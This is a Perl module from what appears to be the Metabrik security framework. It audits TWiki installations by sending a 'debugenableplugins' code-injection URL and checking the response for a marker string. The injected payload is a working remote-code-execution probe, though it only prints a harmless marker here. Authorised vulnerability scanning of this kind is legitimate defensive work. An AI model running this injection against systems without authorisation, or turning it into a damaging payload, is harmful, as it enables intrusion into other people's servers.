#
# $Id$
#
# audit::twiki Brik
#
package Metabrik::Audit::Twiki;
use strict;
use warnings;

use base qw(Metabrik::Client::Www);

sub brik_properties {
   return {
      revision => '$Revision$',
      tags => [ qw(unstable) ],
      author => 'GomoR <GomoR[at]metabrik.org>',
      license => 'http://opensource.org/licenses/BSD-3-Clause',
      attributes => {
         target => [ qw(uri) ],
         url_paths => [ qw($path_list) ],
      },
      attributes_default => {
         target => 'http://localhost/',
         url_paths => [ '/' ],
      },
      commands => {
         debugenableplugins_rce => [ qw(target|OPTIONAL url_path_list|OPTIONAL) ],
      },
   };
}

sub debugenableplugins_rce {
   my $self = shift;
   my ($target, $url_paths) = @_;

   $target ||= $self->target;
   $url_paths ||= $self->url_paths;
   $self->brik_help_run_undef_arg('debugenableplugins_rce', $target) or return;
   $self->brik_help_run_undef_arg('debugenableplugins_rce', $url_paths) or return;
   $self->brik_help_run_undef_arg('debugenableplugins_rce', $url_paths, 'ARRAY') or return;

   my $exploit = '?debugenableplugins=BackupRestorePlugin%3bprint("Content-Type:text/html'.
      "\r\n\r\n".'Vulnerable TWiki Instance")%3bexit';

   $target =~ s/\/*$//;

   for my $url_path (@$url_paths) {
      $url_path =~ s/^\/*//;

      my @users = ();

      my $url = $target.'/'.$url_path.$exploit;

      $self->log->verbose("debugenableplugins_rce: testing url: [$url]");

      my $r = $self->get($url) or next;
      if ($r->{code} == 200) {
         my $decoded = $r->{content};
         $self->log->verbose($decoded);
         if ($decoded =~ /Vulnerable TWiki Instance/i) {
            $self->log->info("Vulnerable");
         }
         else {
            $self->log->info("Not vulnerable?");
         }
      }
   }

   return 1;
}

1;

__END__

=head1 NAME

Metabrik::Audit::Twiki - audit::twiki Brik

=head1 COPYRIGHT AND LICENSE

Copyright (c) 2014-2020, Patrice E<lt>GomoRE<gt> Auffret

You may distribute this module under the terms of The BSD 3-Clause License.
See LICENSE file in the source distribution archive.

=head1 AUTHOR

Patrice E<lt>GomoRE<gt> Auffret

=cut
